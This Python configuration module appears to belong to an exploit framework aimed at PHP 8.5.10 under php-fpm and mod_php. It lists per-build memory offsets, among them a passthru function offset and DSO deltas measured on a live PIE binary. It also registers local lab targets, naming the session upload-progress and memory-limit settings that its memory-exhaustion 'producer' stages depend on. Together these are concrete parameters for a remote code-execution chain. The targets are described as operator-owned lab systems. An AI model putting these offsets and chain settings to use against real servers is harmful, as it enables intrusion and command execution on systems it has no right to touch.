"""profiles.py - BINARY_PROFILES (per-build offsets) + TARGETS registry; modphp TODO."""


BINARY_PROFILES = {
    "ubuntu85-1.3-compact": {
        "name": "ubuntu85-1.3-compact",
        "leak_offset": 0x57030,
        "target_offset": 0x6BB80,
        "stage_offset": 0x850D8,
        "dso_deltas": (0x1800000, 0x1A00000),
        "zif_passthru_offset": 0x3DDAA0,
        "zend_llist_remove_tail_offset": 0x5C9470,
        "blockers": 149,
    },
    # measured live on the operator-owned PIE fpm (2026-10-21):
    # workers are forks of one master (shared layout); php_base constant
    # 0x55ffad000000, stable main chunk 0x7f8875a00000 -> delta below.
    "realapps-pie": {
        "name": "realapps-pie",
        "leak_offset": 0x57030,
        "target_offset": 0x6BB80,
        "stage_offset": 0x850D8,
        "dso_deltas": (0x296DA4A00000,),
        "zif_passthru_offset": 0x6496C2,
        "zend_llist_remove_tail_offset": 0x84C1AB,
        "blockers": 149,
    },
}

TARGETS = {
    # sources: universal/freeze_battery.py TARGETS (host/port/path/sessions dir),
    # universal/fullflow_wiki + fullflow_wp run captures, docs/validation_1021_filmpost.md
    "wiki": {
        "name": "wiki",
        "binary_profile": "realapps-pie",
        "host": "127.0.0.1",
        "port": 28840,
        "path": "/index.php",
        "session_save_path": "/tmp/opencode/realapps/sessions/wiki",
        "ini": {
            # as-found on the running [wiki] pool (UNIVERSAL_PLAN.md, section a):
            # fpm_realapps.conf [wiki]; no upload_progress overrides anywhere in
            # the stack, so compiled 8.5.10 defaults apply (session.c:934-945).
            "memory_limit": "8M (php_admin_value, fpm pool conf)",
            "pm": "static",
            "pm.max_children": "1 (duplicate key: later value wins)",
            "pm.max_requests": "5000",
            "session.upload_progress.enabled": "1 (compiled default, session.c:934)",
            "session.upload_progress.cleanup": "1 (compiled default at runtime; "
                "the ASAN diag receipts override it to 0 - lab-only)",
        },
        "workers": "php-fpm pool [wiki], pm=static, single worker",
        # stock stack has no unserialize endpoint: producer_unser is NOT wired
        # to this target (no app path hands a request body to unserialize()).
        "producer_modules": ("producer_618", "producer_619", "producer_fpmwiki"),
        "status": "available (probe + chain + producer step)",
    },
    "wp": {
        "name": "wp",
        "binary_profile": "realapps-pie",
        "host": "127.0.0.1",
        "port": 28841,
        "path": "/index.php",
        "session_save_path": "/tmp/opencode/realapps/sessions/wp",
        "ini": {
            # same compiled-defaults reasoning as [wiki]; verify pool conf per run
            "memory_limit": "8M (php_admin_value, fpm pool conf)",
            "pm": "static",
            "pm.max_children": "1 (verify per run)",
            "pm.max_requests": "5000",
            "session.upload_progress.enabled": "1 (compiled default, session.c:934)",
            "session.upload_progress.cleanup": "1 (compiled default at runtime)",
        },
        "workers": "php-fpm pool, pm=static",
        "producer_modules": ("producer_618", "producer_619"),
        "status": "available (probe + chain)",
    },
    "modphp": {
        "name": "modphp",
        "binary_profile": None,
        "address_profile": "addresses/apache_libphp.json",
        "host": "127.0.0.1",
        "port": 28850,
        "path": "/mem.php",
        "session_save_path": "/tmp/opencode/modphp_lab/sessions",
        "memory_limit_knob": "2M",  # php_value in the vhost conf; absent -> producer pre-flight failure
        "ini": {
            # receipts: modphp_lab/runs/run_20261021T155303Z_armoom (read-only
            # provenance) + /info.php phase A vs C:
            "memory_limit": "2M (php_value, receipt knob ON; knob OFF -> 128M "
                "build default, no OOM), the producer refuses absent/128M",
            "post_max_size": "8M (info.php receipt)",
            "upload_max_filesize": "2M (info.php receipt)",
            "max_file_uploads": "20 (info.php receipt; arms already at cap)",
            "session.upload_progress.enabled": "1 (receipt)",
            "session.upload_progress.cleanup": "1 (post-arm receipt: sess_labprobe123 cleaned-up)",
            "session.use_only_cookies": "1 (sid via Cookie header only; form-field sid inert)",
        },
        "workers": "httpd 2.4.66 + libphp.so PHP 8.5.10 NTS (mod_php): prefork "
            "children round-robin, ALL survive the machinery OOM; fatal shows as "
            "200 + transcript body (not 500)",
        "producer_stage": "producer_modphp",
        # second producer (--producer unser): offline unserialize OOM class
        # ladder; needs a lab unser.php endpoint (not in the stock stack) and
        # --live takes an explicit --unser-url. producer_modphp stays first.
        "producer_modules": ("producer_modphp", "producer_unser"),
        # receipt ladder (file part count fixed at 20 = max_file_uploads cap):
        # N=262144 -> body 4983500, alloc 266240; 330000 -> 6272764, alloc 331776;
        # 400000 -> 7602764, alloc 401408 (= producer_modphp.RECEIPT_LADDER)
        "status": "run (producer wired, dry default; arm receipt "
            "run_20261021T155303Z_armoom; chain/leak TBD_measure_live_probe)",
    },
}


def is_known_target(value: str) -> bool:
    return value in TARGETS


def profile_for(target_name: str | None, url_target: bool) -> str:
    """Binary profile name for a registered target, or raise ValueError."""
    if url_target or target_name not in TARGETS:
        raise ValueError(
            "no binary profile bound to this target; pass --profile explicitly"
        )
    name = TARGETS[target_name].get("binary_profile")
    if name is None:
        raise ValueError(
            f"target {target_name} has no binary profile yet: {TARGETS[target_name]['status']}"
        )
    return name


def url_for(target_name: str) -> str | None:
    entry = TARGETS.get(target_name)
    if not entry or entry.get("host") is None:
        return None
    return f"http://{entry['host']}:{entry['port']}{entry['path']}"


def producers_for(target_name: str | None) -> tuple[str, ...]:
    """Registered producer modules for a target; default is the fpmwiki stage."""
    entry = TARGETS.get(target_name) or {}
    modules = entry.get("producer_modules")
    return tuple(modules) if modules else ("producer_fpmwiki",)


def known_producers() -> tuple[str, ...]:
    """Every producer module registered by any target (for ad-hoc URL overrides)."""
    names = {
        module
        for entry in TARGETS.values()
        for module in entry.get("producer_modules", ())
    }
    names.update(("producer_fpmwiki", "producer_modphp", "producer_unser"))
    return tuple(sorted(names))


def resolve_producer(target_name: str | None, requested: str | None = None) -> str:
    """Producer stage module: TARGETS producer_stage by default, --producer overrides.

    Keys are module names as in TARGETS (producer_<name>); a bare name is
    prefixed. Registered targets accept only their producer_modules; an ad-hoc
    URL accepts any known producer module.
    """
    entry = TARGETS.get(target_name) or {}
    if requested:
        name = requested if requested.startswith("producer_") else f"producer_{requested}"
        allowed = producers_for(target_name) if target_name else known_producers()
        if name not in allowed:
            raise ValueError(
                f"producer {requested!r} is not available for "
                f"{target_name or 'an ad-hoc URL'}: registered " + ", ".join(allowed)
            )
        return name
    return entry.get("producer_stage") or producers_for(target_name)[0]
